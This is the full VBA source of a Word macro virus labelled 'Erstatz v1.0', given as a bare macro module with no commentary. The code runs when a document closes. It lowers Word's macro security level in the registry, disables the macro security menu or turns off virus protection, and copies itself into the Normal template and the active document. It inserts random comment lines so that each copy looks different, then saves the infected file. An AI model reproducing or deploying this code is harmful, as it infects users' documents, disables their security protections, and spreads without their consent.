   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True
   Sub Document_Close()
   '
   'Erstatz v1.0
   On Error Resume Next
   GoTo setup
   infekt:
   Set nrmal = NormalTemplate.VBProject.VBComponents(1).CodeModule
   Set aktiv = ActiveDocument.VBProject.VBComponents(1).CodeModule
   If nrmal.lines(2, 1) <> "'" Then
   nrmal.deletelines 1, nrmal.countoflines
   nrmal.insertlines 2, aktiv.lines(2, aktiv.countoflines)
   nrmal.insertlines 1, "Sub Document_Close()"
   '
   For n = 9 To nrmal.countoflines
   Randomize
   '
   '
   '
   ma = Int((Rnd * 4) + 1)
   '
   If nrmal.lines(n, 1) = "'" And ma >= 2 Then
   nrmal.deletelines n, 1
   '
   je = je + 1
   If je = 15 Then GoTo ausgang
   '
   End If
   Next n
   End If
   '
   ausgang:
   '
   '
   If aktiv.lines(2, 1) <> "'" Then
   '
   '
   aktiv.deletelines 1, aktiv.countoflines
   aktiv.insertlines 2, nrmal.lines(2, nrmal.countoflines)
   aktiv.insertlines 1, "Sub Document_Open()"
   For i = 9 To aktiv.countoflines
   Randomize
   ma = Int((Rnd * 4) + 1)
   If ma <= 2 Then
   aktiv.insertlines i, "'"
   End If
   Next i
   ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, fileformat:=wdFormatDocument
   End If
   GoTo done
   setup:
   Options.SaveNormalPrompt = False
   Options.SendMailAttach = True
   Options.ConfirmConversions = False
   If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
   CommandBars("Macro").Controls("Security...").Enabled = False
   System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
   Else
   CommandBars("Tools").Controls("Macro").Enabled = False
   Options.VirusProtection = False
   End If
   GoTo infekt:
   done:
   End Sub

